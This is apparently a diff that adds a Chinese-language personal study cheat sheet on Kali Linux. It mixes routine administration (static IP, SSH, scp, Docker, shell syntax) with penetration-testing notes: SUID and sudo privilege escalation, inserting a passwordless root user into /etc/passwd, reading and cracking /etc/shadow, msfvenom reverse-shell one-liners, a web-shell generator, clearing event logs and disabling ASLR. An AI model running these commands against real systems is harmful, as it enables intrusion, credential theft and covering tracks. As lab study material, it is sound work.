@@ -1,0 +1,281 @@
+A安装kali磁盘需要8g，为了更好的保存文件至少要25GB,内存要512mb以上。
+kali Linux下载地址  ：http://www.kali.org/downloads/
+
+kali的基础配置
+vim /etc/network/interfaces                      #进行配置静态ip
+以下为内容 ：
+auto lo
+iface lo inet loopback
+auto eth0
+iface eth0 inet static           #配置eth0使用的默认静态地址
+address 192.168.30.1                #配置ip地址
+netmask 255.255.255.0                 #配置子网掩码
+gateway 192.168.30.254               #配置网关               
+退出后rebots                    #进行系统的重启
+ifconfig etho 自己定的ip地址                          #设置动态ip
+systemctl restart networking                       #重启网卡
+
+路由表
+route  -n              # 查看路由表
+添加路由
+#添加一条路由(发往192.168.62这个网段的全部要经过网关192.168.1.1)
+route add -net 192.168.62.0 netmask 255.255.255.0 gw 192.168.1.1
+#删除一条路由　删除的时候不用写网关
+route del -net 192.168.122.0 netmask 255.255.255.0
+
+
+
+配置ssh服务
+一     先修改sshd_config文件，命令为:
+    vim /etc/ssh/sshd_config
+    将#passwrodSAuthentication on的注释去掉，并将no改为yes 
+    再将PermitRootLogin without-password     修改为    PermitRooLogin yes
+    保存且退出
+二    /etc/init.d/ssh start    或者  service ssh start       #启动ssh服务
+       /etc/init.d/ssh status   或者   service  ssh  status       #查看ssh是否正常启动
+       可设开机自启  systemctl  emable   ssh 
+三     使用ssh登录工具(putty/secureCRT/Xshell)或者直接命令窗口登录
+       ssh   用户名@加ip地址                #输密码后即可登录    ssh账户密码就是本机的用户名跟密码
+
+  scp进行文件交互(前提必须是ssh服务打开)
+1、从服务器下载文件
+  scp username@servername:/path/filename /tmp/local_destination
+  例如scp codinglog@192.168.0.101:/home/kimi/test.txt  /tmp/local_destination   把192.168.0.101上的/home/kimi/test.txt
+  的文件下载到 /tmp/local_destination
+   2、上传本地文件到服务器
+  scp /path/local_filename username@servername:/path  
+  例如scp /var/www/test.php  codinglog@192.168.0.101:/var/www/  把本机/var/www/目录下的test.php文件
+  上传到192.168.0.101这台服务器上的/var/www/目录中
+  
+  3、从服务器下载整个目录
+      scp -r username@servername:remote_dir/ /tmp/local_dir 
+    例如:scp -r codinglog@192.168.0.101 /home/kimi/test  /tmp/local_dir
+  
+  4、上传目录到服务器
+      scp  -r /tmp/local_dir username@servername:remote_dir
+      例如：
+      scp -P 22 -r test      codinglog@192.168.0.101:/var/www/   把当前目录下的test目录上传到服务器
+      的/var/www/ 目录
+
+安装docker   ：apt-get install docker.io
+拉取镜像： docker pull  镜像名称
+查看本地镜像 ：docker  images
+后台运行镜像 :  docker run -it -d 镜像名字 /bin/bash             #-it 是进行交互模式，-d 是后台运行
+进入镜像环境:  docker exec -it  容器id   /bin/bash            #容器id从docker ps 中查看
+停止容器 : docker stop 容器id                       #容器id从docker ps 中查看
+保存对容器的修改:    docker  commit  -m  "修改的作者名字"  -a  "备注"   旧容器id    新容器名字  
+打包docker 镜像:    docker image  save  容器名字  >   名字.tar
+导入打包好的tar docker镜像 ： docker   image  load  <  镜像名字.tar
+删除 容器:   docker rm 容器id
+删除 镜像:  docker rmi  镜像id 
+查看镜像详细信息:   docker inspect  镜像id
+
+当出现 ： Failed to get D-Bus connection: Operation not permitted 这个错误的时候
+使用:   docker run -d --privileged=true centos  /usr/sbin/init                   # -itd  后台交互运行 ,  --privileged=true  使用该参数，container内的root拥有真正的root权限,  centos容器， /usr/sbin/init   将 CMD 或者 entrypoint 设置为 /usr/sbin/init 即可
+然后 :   docker exec -it 容器id /bin/bash     运行即可
+ 
+
+
+
+信息收集工具
+fping与ping不同的地方在于，fping可以在命令行中指定要ping的主机数量范围，也可以指定含有ping的主机列表文件
+fping  -ug 192.168.135.22/27
+fping  -ag   192.168.135.0/24
+arping 可以进行二层发现     可以返回其mac地址
+arping  192.168.135.1  -c  1                  #  - c 是ping的次数  
+arping  - c 5  192.168.135.2  | grep "byte  from" | cut -d  "" -f 4             #对结果进行grep筛选mac
+nmap工具
+namp 脚本路径
+/usr/share/nmap/scripts
+使用ping检查192.168.135.0/24这个网段
+nmap  -sP  192.168.135.0/24
+使用nmap进行端口扫描
+nmap  -p  1-1000  192.168.135.1
+扫描特定端口
+namp -p  22  192.168.135.1
+内网中查看存活主机
+nmap  -sP  192.168.135.1-255
+sS 进行半开放扫描
+nmap  -sS  192.168.1.1
+sT 进行TCP扫描,TCP扫描需要进行三次握手，找到适用的tcp端口
+nmap  -sT  192.168.135.1
+sU  进行UDP扫描,发送UDP数据包到目标主机并等待响应。
+sV  进行版本的扫描
+namp  -O  192.168.135.1                   #查看操作系统的类型
+
+ls >  c              #则c 的内容就是ls下所有的文件名内容
+
+查看root 最后3次登录的日志
+#last -n 3（20分）
+
+密码策源配置文件 ：etc/login.defs
+PASS_MAX_DAYS   999999      #密码的最大有效期，99999为永久有效
+PASS_MIN_DAYS   0         #是否可以修改密码，0为可修改，非0为多少天可以修改
+PASS_MIN_LEN     5           #密码最小长度
+PASS_MAX_LEN    9         #密码最大长度
+PASS_WARN_AGE     7                 #密码失效前几天可以登录系统修改密码
+
+linux的防火墙   ：iptables
+iptables -A INPUT -p tcp --dport 21 -j ACCEPT                  #给21的ftp端口添加一条入站规则
+iptables -A OUTPUT -p tcp  -sport 21 -j ACCEPT                  #给21的ftp的端口添加一条出站规则
+
+awk 命令
+awk -F: '{if($3==0)print $1}' /etc/passwd                  #查找etc/passwd下的所有uid为0的用户
+awk  -F: '{print $1}' /etc/passwd                       #列出etc/passwd下所有的用户名
+
+arp-a   #可以查看APR缓存
+
+查找具有root权限的文件
+find / -perm -4000 2>/dev/null
+
+/dev/null 可以消除使用命令的日志的错误记录。
+
+nmap -sT -p-  IP地址           #即可查找所有的端口号包括隐藏的。
+
+dirbster工具的详细使用: https://www.jianshu.com/p/79c7b1eda56e
+
+dirb的字典目录是 /usr/share/dirb/wordlists/
+
+python调用本地的shell : echo "import pty; pty.spawn('/bin/bash')"  >/tmp/shell.py           (tmp这里权限不限制)
+python  文件  
+
+suid提权:  find / -perm -u=s type=f  2>/dev/null 
+
+
+john --wordlist=p.txt --stdout --rules >  u         #john  生成弱口令字典(p.txt为用户信息) ，对用户信息进行生成弱口令为u 的文件。
+
+kali的自带字典目录:  /usr/share/wordlist
+
+john破解shadow密码 (指定字典 ): john --wordlist=./password.lst /etc/shadow 
+
+g++编译c程序:      g++ -Wall -pedantic -O2 -std=c++11 -pthread -o 新文件名  c程序文件名 -lutil
+
+find加可执行系统命令(前提find为suid权限) ：find / -type f -name abc -exec "/bin/sh" \;
+
+使用sudo命令查看普通用户可以哪些具有root权限的命令 :  sudo -l
+
+teehee命令可以写入文件内容并不覆盖文件原有内容
+使用teehee命令将一个无密码用户admin写入到/etc/passwd文件，并加入到root组中
+echo "admin::0:0:::/bin/bash" | sudo teehee -a /etc/passwd
+
+base32 提权： base32 "/etc/shadow" | base32 --decode
+
+python -c 'import pty; pty.spawn("/bin/bash")'            # python使显示界面更好。打开终端的命令
+
+你是第一次运行msf，你需要先启动数据库服务并初始化  : 
+启动postgresql:    service postgreaql start 
+创建并初始化数据库:   msfdb  init 
+启动msf:  msfconsole
+msf中常用的监听模块: use exploit/multi/handler 
+msfvenom —platform 环境类型 -f 包的类型 -p 使用的payload LHOST=攻击机的ip LPORT=连接攻击的端口 -o 木马名称
+
+sudo执行以suid权限执行某个文件: sudo -u root java -jar payload.jar
+
+msfvenom生成各种payload的命令: https://www.cnblogs.com/backlion/p/6000544.html
+
+execute（在目标机上执行文件）
+
+clearev命令来清除事件日志：
+
+msfvenom生成反弹shell的一句话:  msfvenom  -l  payloads | grep 'cmd/unix/reverse'                  #查找可以利用的payloads
+进行一句话生成:  
+msfvenom -p cmd/unix/reverse_bash lhost=192.168.37.131 lport=1234 R      #bash反弹一句话
+msfvenom -p cmd/unix/reverse_netcat lhost=192.168.37.131 lport=1234 R    #nc反弹一句话
+msfvenom -p cmd/unix/reverse_python lhost=192.168.37.131 lport=1234 R  #python反弹一句话
+
+nmap的交互模式(2.1~5.3版本才可以使用):   nmap --interactive                       #Nmap在交互模式中启动，这是Nmap在交互模式中启动，便于进行多个扫描。
+
+rbash的绕过: https://www.freebuf.com/articles/system/188989.html
+git 提权: sudo git help config     或者     sudo git  -p help             #进入后输入 !/bin/bash  即可得到sh的权限       
+导入export PATH=/usr/sbin:/usr/bin:/sbin:/bin 配置环境配置
+
+nmap提权:
+自己写个脚本 ：echo  'os.execute("/bin/sh")' > shell.sh     然后  nmap  --script=目录的shell.sh  
+
+rpcinfo 命令 ： 
+rpcinfo -p  ip号                     #查看指定ip的是否开启rpcinfo服务信息
+
+showmount -e  ip号                 #显示NFS服务器上所有的共享目录
+
+/proc/filesystems文件观察当前系统具体都支持哪些文件系统
+
+mount实现window和linux文件共享
+1.win10右键属性高级共享该文件夹(例如:liushell,里面有个文件为789.txt)，设置权限为一个新建的用户名。
+2.在liunx系统终端中输入:  mount -t cifs  //window的IP号/liushell  /mnt(要挂载的位置)  -o username=新建的用户名，password=新建的用户名密码
+
+rpm  -qa       #查看linux已安装的软件
+
+cat   /etc/init.d/          #查看已安装的服务
+
+weevelylinux下的菜刀工具
+weevely  genrate  连接密码  /tmp/shell.php                   #在tmp目录下生成shell.php文件，连接密码为admin
+连接时: weevely 上传的shell路劲 密码 
+
+nmap 进行 for循环扫端口信息   ：
+for i in 1001 1101 1011 1001;do nmap ip号 -p $i;done 
+
+cp 复制当前目录所有内容   ：cp  ./*   位置 
+
+openssl rand -base64 10            #利用openssl随机生成的base64的密码，后面的数字是指定的密码长度
+
+xargs的使用:  cat 5.txt | xargs     #可以将多行内容转换为单行             cat 5.txt  | xargs -n数字        #也可以直指定为多行输出
+echo "nameXnameXnameXname" | xargs -dX -n2            #也可以指定一个定界符
+cat url-list.txt | xargs wget -c                 #url-list.txt 里包含了许多 url，所以，然后进行批量下载所有
+
+使用shell命令的前提是 #!/bin/bash
+ssh 加shell命令           # ssh  kali@192.168.239.203 "shell命令"   ,然后输入密码即可      
+
+反引号是命令替换、单引号是强引用、双引号是弱引用。单引号会忽略所有的特殊字符
+[root@localhost fwz]# echo The date is `date`
+　　The date is 2016年 04月 21日 星期一 21:15:43 CST
+
+expr命令是一个手工命令行计数器，用于在UNIX/LINUX下求表达式变量的值，一般用于整数值，也可用于字符串。
+echo "It is a test" > myfile          #将内容写入指定文件中
+echo "it is a test" >> myfile             #将内容追加到指定文件中
+echo 会自动加上\n,print可以引用文本，还可以在其中使用格式化字符串，还可以制定字符串的宽度，左右对其方式等。
+
+shell的 条件表达式:  
+if (条件语句1)
+then
+    输出内容
+elif 条件语句2 
+then 
+    输出内容2
+else
+    输出内容N
+fi
+
+shell  的for循环 :
+for i in itme1,....itmeN
+do
+       命令1
+       命令2
+       .......
+done
+写成一行是   for var in item1 item2 ... itemN; do command1; command2… 
+
+awk '{print}' 5.txt            #追行读取内容
+awk '{print $数字}'    5.txt            #打印指定第几列的内容
+
+在命令行解释器中，--的意思是，以后的部分不会再包含参数选项。
+如果我们需要查看一个文件名是--name的文件，我们就不能用cat --name来读取，也不能用cat '--name'，而必须要用cat -- --name。
+
+
+添加环境变量:
+whereis   python3             #查看某文件的位置，比如python3，显示出位置是:    /usr/local/python3/bin
+cd  /etc/profile.d/
+ls              #会发现有许多的sh文件，在这里创建一个sh文件
+vi  python3.sh 
+# 内容如下:  
+export PATH="$PATH:/usr/local/python3/bin"                 #添加python3位置路劲
+
+source   ../profile                      #重载文件
+echo   $PATH                     #查看当前环境变量是否添加        
+
+./configure --prefix=/usr/local/test1                   
+configure 是一个进行用户个性配置的工具        --prefix 是指定安装的目录             /usr/local/test1 是安装的目录
+这样的好处是安装后的所有文件都放到了 /usr/local/test1(指定的安装目录)下, 不会分散到其他地方
+如果不配置该选项，安装后可执行文件默认放在/usr /local/bin，库文件默认放在/usr/local/lib，配置文件默认放在/usr/local/etc，其它的资源文件放在/usr /local/share，比较凌乱。
+        
+ldd  文件名          #打印该文件的动态链接库
+关闭地址随机化:    echo 0 > /proc/sys/kernel/randomize_va_space
